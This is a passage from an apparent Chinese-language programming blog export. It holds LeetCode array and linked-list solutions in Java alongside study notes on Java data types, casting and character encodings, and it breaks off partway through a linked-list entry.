<h2 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/">704. 二分查找</a></h2><p>本题是典型的二分查找题目，题目的前提是数组为有序数组，同时题目还强调数组中无重复元素，因为一旦有重复元素，使用二分查找法返回的元素下标可能不是唯一的，这些都是使用二分法的前提条件</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public <span class="type">int</span> search(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span> , right = nums.length<span class="number">-1</span>;</span><br><span class="line">        while(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">int</span> mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> num = nums[mid];</span><br><span class="line">            <span class="keyword">if</span>(num == target)&#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num &lt; target)&#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a><strong>复杂度分析</strong></h3><ul>
<li>时间复杂度：O*(log*n)，其中 n 是数组的长度。</li>
<li>空间复杂度：O(1)。</li>
</ul>
<span id="more"></span>

<h2 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a><a href="https://leetcode-cn.com/problems/search-insert-position/">35. 搜索插入位置</a></h2><p>​	还是二分查找，相对于704题来说，相当于多了一个额外的条件：即如果不存在数组中的时候需要返回按顺序插入的位置。</p>
<p>​	这样问题可以转化为：<strong>在一个有序数组中找到一个大于等于target的下标</strong></p>
<p>具体实现：和前面二分查找一样，但查找结束如果没有相等值则返回left，该值<strong>始终为需要插入的位置</strong>（至于为什么可以用几个实例理解一下）</p>
<p>或者利用下面方法理解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> , right = nums.length-<span class="number">1</span>,ans = nums.length;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left+((right - left)&gt;&gt;<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(target &lt;= nums[mid])&#123;</span><br><span class="line">                ans = mid;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="34-在排序数组中查找元素的第一个和最后一个位置"><a href="#34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="34. 在排序数组中查找元素的第一个和最后一个位置"></a><a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">34. 在排序数组中查找元素的第一个和最后一个位置</a></h2><p>想到一种比较好记忆的方法如下所示：</p>
<p>缺点在于：如果把int换成float，<strong>第四行代码的target+1就没法准确定义了</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] searchRange(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftIdx</span> <span class="operator">=</span> searchIdx(nums,target);<span class="comment">//找到第一个大于等于target的数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightIdx</span> <span class="operator">=</span> searchIdx(nums,(target+<span class="number">1</span>))-<span class="number">1</span>;<span class="comment">//找到第一个大于等于target+1的数字，下标-1就是最后一个target的下标</span></span><br><span class="line">        <span class="keyword">if</span>(leftIdx==nums.length || nums[leftIdx]!=target )&#123;<span class="comment">//如果数组里面的数全都小于target，或者找到的第一个大于等于target的数不是target，则返回&#123;-1，-1&#125;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>,-<span class="number">1</span>&#125;;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;leftIdx,rightIdx&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//和第35题一样的思路，找到第一个大于等于target的下标</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">searchIdx</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> , right = nums.length - <span class="number">1</span>, ans = nums.length;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &gt;= target )&#123;</span><br><span class="line">                ans = mid;</span><br><span class="line">                right = mid-<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid +<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>附上官方题解，其实相比于上面解法，定义的seach方法加了一个选择条件而已。推荐记忆理解下面这个解法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] searchRange(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftIdx</span> <span class="operator">=</span> binarySearch(nums, target, <span class="literal">true</span>);<span class="comment">//查找第一个大于等于target的数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightIdx</span> <span class="operator">=</span> binarySearch(nums, target, <span class="literal">false</span>) - <span class="number">1</span>;<span class="comment">//严格查找第一个大于target的数</span></span><br><span class="line">        <span class="keyword">if</span> (leftIdx &lt;= rightIdx &amp;&amp; rightIdx &lt; nums.length &amp;&amp; nums[leftIdx] == target &amp;&amp; nums[rightIdx] == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;leftIdx, rightIdx&#125;;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target, <span class="type">boolean</span> lower)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>, ans = nums.length;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt; target || (lower &amp;&amp; nums[mid] &gt;= target)) &#123;</span><br><span class="line">                <span class="comment">//这里的if条件中有两个选择，开启了lower后，则查找第一个大于等于target的数，否则查找的是第一个大于target的数</span></span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">                ans = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="209、长度最小的子数组"><a href="#209、长度最小的子数组" class="headerlink" title="209、长度最小的子数组"></a>209、长度最小的子数组</h2><blockquote>
<p>题目描述：给定一个含有 n 个正整数的数组和一个正整数 target 。</p>
<p>找出该数组中满足其和 ≥ target 的长度最小的 连续子数组 [numsl, numsl+1, …, numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 </p>
</blockquote>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：target = 7, nums = [2,3,1,2,4,3]</span><br><span class="line">输出：2</span><br><span class="line">解释：子数组 [4,3] 是该条件下的长度最小的子数组。</span><br></pre></td></tr></table></figure>

<h3 id="思路一：暴力求解"><a href="#思路一：暴力求解" class="headerlink" title="思路一：暴力求解"></a>思路一：暴力求解</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//总和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sublength</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//子数组长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; nums.length ; i++)&#123;<span class="comment">//起点为i</span></span><br><span class="line">            sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i ; j &lt; nums.length;j++)&#123;<span class="comment">//终点j不断增加</span></span><br><span class="line">                sum += nums[j];</span><br><span class="line">                <span class="keyword">if</span> (sum&gt;= target )&#123;<span class="comment">//如果发现了一个sum&gt;target则j不继续往后扩，更新sublength</span></span><br><span class="line">                    sublength = j - i + <span class="number">1</span>;</span><br><span class="line">                    result = result &lt; sublength ? result : sublength;<span class="comment">//每次外循环判断更新的sublength是否最小</span></span><br><span class="line">                    <span class="keyword">break</span>;<span class="comment">//跳出内循环</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result == Integer.MAX_VALUE ?<span class="number">0</span> :result;<span class="comment">//如果一个没有则返回0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*执行用时：133 ms, 在所有 Java 提交中击败了12.68%的用户</span></span><br><span class="line"><span class="comment">内存消耗：41.1 MB, 在所有 Java 提交中击败了43.15%的用户*/</span></span><br></pre></td></tr></table></figure>

<p>时间复杂度：O(n^2 )，其中 n是数组的长度。需要遍历每个下标作为子数组的开始下标，对于每个开始下标，需要遍历其后面的下标得到长度最小的子数组。</p>
<p>空间复杂度：O(1)</p>
<h3 id="思路二：滑动窗口"><a href="#思路二：滑动窗口" class="headerlink" title="思路二：滑动窗口"></a>思路二：滑动窗口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">//滑动窗口法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;right &lt; nums.length ; right++)&#123;</span><br><span class="line">            sum += nums[right];</span><br><span class="line">            <span class="keyword">while</span>(sum &gt;= s)&#123;</span><br><span class="line">                result = Math.min(result , right - left + <span class="number">1</span>);<span class="comment">//判断本次结果和result哪个小</span></span><br><span class="line">                sum -= nums[left++];<span class="comment">//起始点右移</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result == Integer.MAX_VALUE ? <span class="number">0</span>:result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/209.%E9%95%BF%E5%BA%A6%E6%9C%80%E5%B0%8F%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84.gif" alt="209.长度最小的子数组"></p>
<h3 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul>
<li><p>时间复杂度：O(n)，其中 n是数组的长度。指针start 和end 最多各移动 n 次。</p>
</li>
<li><p>空间复杂度：O(1)。</p>
</li>
</ul>
<h2 id="59-螺旋矩阵-II"><a href="#59-螺旋矩阵-II" class="headerlink" title="59. 螺旋矩阵 II"></a><a href="https://leetcode-cn.com/problems/spiral-matrix-ii/">59. 螺旋矩阵 II</a></h2><p>这个题目按照题目要求模拟填入过程就可以了：</p>
<p><strong>主要难点在于四个”指针”left、right、top、bottom之间的把控</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> , right = n-<span class="number">1</span> , top = <span class="number">0</span> , bottom = n-<span class="number">1</span> ;</span><br><span class="line">        <span class="type">int</span>[][] Mat = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> n*n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span> ; </span><br><span class="line">        <span class="keyword">while</span>(num &lt;= end)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left ;i &lt;= right; i++)&#123;<span class="comment">// left to right.</span></span><br><span class="line">                Mat[top][i] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top ; i &lt;= bottom; i++)&#123;<span class="comment">// top to bottom.</span></span><br><span class="line">                Mat[i][right] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> right ; i &gt;= left; i--)&#123;<span class="comment">// right to left.</span></span><br><span class="line">                Mat[bottom][i] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            bottom--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bottom ; i &gt;= top; i--)&#123;<span class="comment">// bottom to top.</span></span><br><span class="line">                Mat[i][left] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Mat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(二)——数据类型及相关细节</title>
    <url>/2022/03/02/08-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)%20/</url>
    <content><![CDATA[<h1 id="（一）Java数据类型"><a href="#（一）Java数据类型" class="headerlink" title="（一）Java数据类型"></a>（一）Java数据类型</h1><p><img src="https://github.com/Cloudyunn/img/master/note/image-20220302113514650.png" alt="image-20220302113514650"></p>
<p>这里需要注意：String在Java里面是属于一个类而不是数据类型。</p>
<h2 id="1、整数类型细节"><a href="#1、整数类型细节" class="headerlink" title="1、整数类型细节"></a>1、整数类型细节</h2><p><img src="https://github.com/Cloudyunn/img/master/note/image-20220302113814202.png" alt="image-20220302113814202"></p>
<ul>
<li>Java的整型常量默认为int型，声明long型常量必须在后面加’l’或者‘L’。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> a=<span class="number">1L</span></span><br></pre></td></tr></table></figure>

<h2 id="2、浮点数细节"><a href="#2、浮点数细节" class="headerlink" title="2、浮点数细节"></a>2、浮点数细节</h2><ul>
<li>Java的浮点型常量默认为double类型，声明float型常量，通常在后面加’f’或‘F’</li>
<li>通常情况下，应该使用double型，因为比float型更精确。</li>
<li>浮点数使用陷阱：2.7和8.1&#x2F;3比较，结果<strong>不同</strong>。（具体可在<strong>计算机组成原理</strong>里面了解）</li>
<li>如果涉及浮点数计算，例如除法得到的变量：a &#x3D; 8.1 &#x2F; 3。一般用其进行条件判断时，不使用”&#x3D;”来作条件（2.7和8.1&#x2F;3比较例子），而是让条件判断为一个范围，例如：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2.7</span>;</span><br><span class="line">b = <span class="number">8.1</span> / <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span>( a =	b)&#123;</span><br><span class="line">	<span class="comment">//错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//应该使用以下条件判断：</span></span><br><span class="line"><span class="keyword">if</span>(Math.abs(a - b) &lt; <span class="number">0.00001</span>)&#123;</span><br><span class="line">	<span class="comment">//0.00001这个数字可以自设定，属于精度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="3、字符类型细节"><a href="#3、字符类型细节" class="headerlink" title="3、字符类型细节"></a>3、字符类型细节</h2><ul>
<li>字符常量使用单引号（’ ‘）括起来的单个字符，而不能使用双引号（会报错？）。例如：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="string">&#x27;中&#x27;</span>; <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="string">&quot;9&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Java中允许使用转义字符来将其后的字符转变为特殊字符型常量。</li>
<li>Java中，char的本质是一个整数，在输出时，是unicode码对应的字符。所以直接给char赋值一个整数的话，输出时会按照对应的unicode字符输出。</li>
<li>char类型是可以进行运算的，因为其都对应有Unicode码</li>
</ul>
<p>字符类型本质：</p>
<ul>
<li>存储：‘a’ &#x3D;&gt; 码值97 &#x3D;&gt; 二进制（~）&#x3D;&gt; 存储</li>
<li>读取：二进制（~）&#x3D;&gt; 97 &#x3D;&gt; ‘a’ &#x3D;&gt; 显示</li>
</ul>
<h1 id="（二）字符编码表"><a href="#（二）字符编码表" class="headerlink" title="（二）字符编码表"></a>（二）字符编码表</h1><ul>
<li>ASCII（一个字节表示，一共128个字符。实际上一个字节可以表示256个字符，但只用128个）</li>
<li>Unicode（使用两个字节表示字符，字母和汉字统一都是两个字节 &#x3D;&gt; <strong>空间浪费</strong> ）</li>
<li>utf-8（大小可变，字母使用1个字节，汉字使用3个字节）</li>
<li>gbk（可以表示汉字，范围光，字母使用1个字节，汉字2个字节）</li>
<li>gb2312（可以表示汉字，gb2312 &lt; gbk（国标扩））</li>
<li>big5（繁体中文）</li>
</ul>
<h1 id="（三）基本数据类型转换"><a href="#（三）基本数据类型转换" class="headerlink" title="（三）基本数据类型转换"></a>（三）基本数据类型转换</h1><h2 id="1、自动类型转换"><a href="#1、自动类型转换" class="headerlink" title="1、自动类型转换"></a>1、自动类型转换</h2><p>当java程序在进行赋值或运算时，<strong>精度小的类型自动转换为精度大的数据类型</strong>。</p>
<p>数据类型按精度（容量）大小排序为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char =&gt; int =&gt; long =&gt; float =&gt;double</span><br><span class="line"></span><br><span class="line">byte =&gt; short =&gt; int =&gt; long =&gt; float =&gt; double</span><br></pre></td></tr></table></figure>

<h2 id="2、自动类型转换注意和细节"><a href="#2、自动类型转换注意和细节" class="headerlink" title="2、自动类型转换注意和细节"></a>2、自动类型转换注意和细节</h2><ul>
<li><p>多种类型的数据混合运算时，系统首先自动将所有数据转换为<strong>容量最大</strong>（也就是精度最高）的那种数据类型，再进行计算。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">//float num3 = num2 + 1.2 错误的，因为num2 + 1.2默认结果是double类型</span></span><br><span class="line"><span class="comment">//float num3 = num2 + 1.2f 正确的</span></span><br><span class="line"><span class="type">double</span> <span class="variable">num3</span> <span class="operator">=</span> num2 + <span class="number">1.2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>（byte、short）和char之间不能进行自动转换</p>
</li>
<li><p>byte、short、char三者可以计算，在计算时首先转换为int类型</p>
</li>
<li><p>boolean不参与转换</p>
</li>
<li><p>自动提升原则：表达式结果的类型自动提升为操作数中最大的类型</p>
</li>
</ul>
<h2 id="3、强制类型转换"><a href="#3、强制类型转换" class="headerlink" title="3、强制类型转换"></a>3、强制类型转换</h2><p>介绍：强制类型转换是自动类型转换的<strong>逆过程</strong>，就是将容量大的数据类型转换为小的。使用时要加上强制转换符（），但可能造成精度降低或者溢出，应该注意。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (<span class="type">int</span>)<span class="number">1.9</span></span><br></pre></td></tr></table></figure>

<h2 id="4、强制类型转换细节"><a href="#4、强制类型转换细节" class="headerlink" title="4、强制类型转换细节"></a>4、强制类型转换细节</h2><ul>
<li><p>强制符号只针对于最近的操作数有效，往往会使用小括号提升优先级。</p>
</li>
<li><p>char类型可以保存int的常量值，但不能保存int的变量值，需要强转。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="number">100</span>;<span class="comment">//ok</span></span><br><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">100</span>;<span class="comment">//ok</span></span><br><span class="line"><span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> m;<span class="comment">//错误，不能存int的变量，因为自动转换无法满足从精度高到精度小</span></span><br><span class="line"><span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> (<span class="type">char</span>)m;<span class="comment">//ok</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>byte和short类型在进行运算时，当作int类型处理。</p>
</li>
</ul>
<h2 id="5、基本数据类型和String类型的转换"><a href="#5、基本数据类型和String类型的转换" class="headerlink" title="5、基本数据类型和String类型的转换"></a>5、基本数据类型和String类型的转换</h2><ul>
<li>基本类型转String类型：将基本类型的值直接加 + “”</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> n1 + <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>String类型转基本数据类型：通过基本类型的包装类调用parseXX方法即可</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> Integer.parseInt(s5);</span><br></pre></td></tr></table></figure>

<ul>
<li>String类型转换成字符char：<strong>不能用上述用法</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//怎么把字符串转成字符char -&gt; 含义是指把字符串的第一个字符得到：</span></span><br><span class="line"><span class="type">String</span> <span class="variable">S1</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">System.out.println(S1.charAt(<span class="number">0</span>));<span class="comment">//取出字符串S1的第一个字符&quot;1&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="6、基本数据类型和String类型转换的细节"><a href="#6、基本数据类型和String类型转换的细节" class="headerlink" title="6、基本数据类型和String类型转换的细节"></a>6、基本数据类型和String类型转换的细节</h2><ul>
<li>在将String类型转换成基本数据类型时，要确保String类型能能够转换成有效的数据，例如可以把”123”转换成一个整数，但是不能把”hello“转成一个整数。</li>
<li>如果格式不正确，就会抛出异常，程序就会终止（详细见异常处理章节）</li>
</ul>
<h1 id="（四）Java类的组织形式"><a href="#（四）Java类的组织形式" class="headerlink" title="（四）Java类的组织形式"></a>（四）Java类的组织形式</h1><p><img src="https://github.com/Cloudyunn/img/master/note/image-20220302113243813.png" alt="image-20220302113243813"></p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode——链表</title>
    <url>/2022/03/28/11-leetcode%E2%80%94%E2%80%94%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下leetcode链表部分题目的刷题笔记</p>
<h2 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203. 移除链表元素"></a><a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">203. 移除链表元素</a></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 因为删除可能涉及到头节点，所以设置dummy节点，统一操作</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span> , head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;<span class="comment">//cur指向当前头节点</span></span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.val == val)&#123;<span class="comment">//如果当前头节点值等于val</span></span><br><span class="line">                <span class="comment">//则直接修改前一个结点的指针指向下一个节点（删除当前节点）</span></span><br><span class="line">                pre.next = cur.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//不相等则继续看下一个节点</span></span><br><span class="line">                pre = cur ;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next;<span class="comment">//当前节点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="707-设计链表"><a href="#707-设计链表" class="headerlink" title="707. 设计链表"></a><a href="https://leetcode-cn.com/problems/design-linked-list/">707. 设计链表</a></h2><p>在链表类中实现这些功能：</p>
<blockquote>
